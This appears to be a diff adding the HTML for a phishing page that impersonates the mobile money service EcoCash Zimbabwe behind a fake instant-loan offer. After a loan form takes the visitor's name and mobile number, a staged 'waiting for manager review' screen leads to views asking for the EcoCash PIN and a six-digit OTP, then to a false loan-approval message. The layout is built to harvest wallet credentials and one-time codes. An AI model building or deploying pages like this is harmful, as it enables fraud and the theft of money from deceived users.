@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash Zimbabwe - Instant Loan & Portal</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header class="bank-header">
+    <div class="header-container">
+      <div class="logo-area">
+        <span class="bank-badge">ECOCASH</span>
+        <h1 class="bank-title">EcoCash</h1>
+      </div>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <!-- VIEW 1: LOAN CALCULATOR / HOME -->
+    <div id="view-calculator" class="card active-card">
+      <h2>Get Your Loan Today</h2>
+      <p class="subtitle">Instant approval • Low interest • Easy terms</p>
+      
+      <div class="calc-box">
+        <div class="input-group">
+          <label>Loan Amount (USD)</label>
+          <input type="text" id="calc-amount" value="USD 1,000" readonly>
+          <input type="range" id="amount-range" min="50" max="5000" step="50" value="1000">
+          <div class="range-labels"><span>USD 50</span><span>USD 5,000</span></div>
+        </div>
+
+        <div class="input-group">
+          <label>Loan Duration (Months)</label>
+          <input type="range" id="duration-range" min="1" max="12" value="6">
+          <span id="duration-val">6 Months</span>
+        </div>
+
+        <div class="monthly-display">
+          <span>Monthly Repayment</span>
+          <h3 id="monthly-payment">USD 185</h3>
+        </div>
+      </div>
+
+      <button id="btn-start-app" class="primary-btn">APPLY NOW</button>
+
+      <div class="features-row">
+        <div class="feature-item">
+          ⚡ <strong>Fast</strong>
+          <span>Within 24 hours</span>
+        </div>
+        <div class="feature-item">
+          💰 <strong>Low Interest</strong>
+          <span>From 10%</span>
+        </div>
+        <div class="feature-item">
+          🔒 <strong>Secure</strong>
+          <span>EcoCash Protection</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 2: MULTI-STEP APPLICATION FORM -->
+    <div id="view-form" class="card hidden">
+      <div class="form-header">
+        <h2>Loan Application</h2>
+        <span id="step-indicator">Step 1 of 3</span>
+      </div>
+      <div class="progress-bar-container">
+        <div id="progress-fill" style="width: 33%;"></div>
+      </div>
+
+      <!-- Step 1: Details -->
+      <div class="form-step active-step" data-step="1">
+        <div class="field">
+          <label>Loan Type</label>
+          <select id="loan-type">
+            <option value="" disabled selected>Select loan type (e.g., Business Loan)</option>
+            <option value="Business Loan">Business Loan</option>
+            <option value="Instant Loan">Instant Loan</option>
+            <option value="Emergency Loan">Emergency Loan</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Loan Amount (USD)</label>
+          <input type="number" id="form-amount" placeholder="Example: 1000" required>
+        </div>
+        <div class="field">
+          <label>Loan Purpose</label>
+          <textarea id="loan-purpose" placeholder="Example: Expand my retail shop inventory" rows="3" required></textarea>
+        </div>
+        <button type="button" class="primary-btn next-btn" disabled>NEXT STEP</button>
+      </div>
+
+      <!-- Step 2: Personal Info & EcoCash Number -->
+      <div class="form-step hidden" data-step="2">
+        <div class="row-fields">
+          <div class="field">
+            <label>First Name</label>
+            <input type="text" id="first-name" placeholder="Example: Tendai" required>
+          </div>
+          <div class="field">
+            <label>Last Name</label>
+            <input type="text" id="last-name" placeholder="Example: Moyo" required>
+          </div>
+        </div>
+        <div class="field">
+          <label>EcoCash Mobile Number</label>
+          <input type="tel" id="user-contact" maxlength="10" pattern="[0-9]{10}" placeholder="Example: 0771234567" required>
+          <small class="hint">Enter your valid 10-digit EcoCash Zimbabwe mobile number (starting with 077 or 078).</small>
+        </div>
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">BACK</button>
+          <button type="button" class="primary-btn next-btn" disabled>NEXT STEP</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Employment & Summary -->
+      <div class="form-step hidden" data-step="3">
+        <div class="field">
+          <label>Employment Status</label>
+          <select id="employment-status">
+            <option value="" disabled selected>Select status (e.g., Business Owner)</option>
+            <option value="Employed">Employed</option>
+            <option value="Self-Employed">Self-Employed</option>
+            <option value="Business Owner">Business Owner</option>
+          </select>
+        </div>
+        <div class="field">
+          <label>Annual Income (USD)</label>
+          <input type="number" id="annual-income" placeholder="Example: 12000" required>
+        </div>
+
+        <div class="summary-box">
+          <h3>Application Summary</h3>
+          <p><strong>Amount:</strong> <span id="sum-amount">-</span></p>
+          <p><strong>Duration:</strong> <span id="sum-duration">-</span></p>
+          <p><strong>Purpose:</strong> <span id="sum-purpose">-</span></p>
+          <p><strong>Applicant:</strong> <span id="sum-name">-</span></p>
+        </div>
+
+        <div class="button-group">
+          <button type="button" class="secondary-btn prev-btn">BACK</button>
+          <button type="button" id="btn-submit-app" class="primary-btn" disabled>SUBMIT APPLICATION</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- VIEW 3: WAITING FOR ADMIN APPROVAL -->
+    <div id="view-waiting" class="card hidden center-card">
+      <div class="spinner"></div>
+      <h2>Application Submitted</h2>
+      <p>Your application has been sent. Please wait for confirmation.</p>
+      <div class="status-box">
+        <span id="waiting-status-text">Waiting for manager to review details...</span>
+      </div>
+    </div>
+
+    <!-- VIEW 4: PIN & LOGIN ENTRY -->
+    <div id="view-login" class="card hidden">
+      <div class="login-header">
+        <span class="bank-badge sm">ECOCASH</span>
+        <h2>Enter EcoCash Number</h2>
+        <p>Enter your 10-digit mobile number and PIN to proceed</p>
+      </div>
+      <div class="field">
+        <label>EcoCash Number</label>
+        <input type="tel" id="login-contact" maxlength="10" pattern="[0-9]{10}" placeholder="Example: 0771234567" required>
+      </div>
+      <div class="field">
+        <label>Enter EcoCash PIN (4 Digits)</label>
+        <div class="pin-inputs">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+          <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        </div>
+        <span id="pin-error" class="error-text hidden">Incorrect PIN. Please try again.</span>
+      </div>
+      <button id="btn-login" class="primary-btn" disabled>LOG IN</button>
+    </div>
+
+    <!-- VIEW 5: OTP VERIFICATION (6 DIGITS) -->
+    <div id="view-otp" class="card hidden">
+      <h2>OTP Verification</h2>
+      <p>Enter the 6-digit OTP sent to <span id="otp-target-display"></span></p>
+      <div class="field">
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+          <input type="text" maxlength="1" class="otp-box" inputmode="numeric">
+        </div>
+        <span id="otp-error" class="error-text hidden">Incorrect OTP. Please try again.</span>
+      </div>
+      <button id="btn-submit-otp" class="primary-btn" disabled>SUBMIT OTP</button>
+    </div>
+
+    <!-- VIEW 6: SUCCESS -->
+    <div id="view-success" class="card hidden center-card">
+      <div class="success-icon">✓</div>
+      <h2>Congratulations!</h2>
+      <p>Your loan has been approved! Funds will be sent to your account shortly.</p>
+      <div class="approved-amount-box">
+        <span>APPROVED AMOUNT</span>
+        <h3 id="approved-amount-val">USD 1,000</h3>
+      </div>
+      <button id="btn-home" class="primary-btn">BACK TO HOME</button>
+    </div>
+  </main>
+
+  <footer class="bank-footer">
+    <p>&copy; 2026 EcoCash Zimbabwe. All rights reserved.</p>
+  </footer>
+
+  <script src="script.js"></script>
+</body>
+            </html>
+  
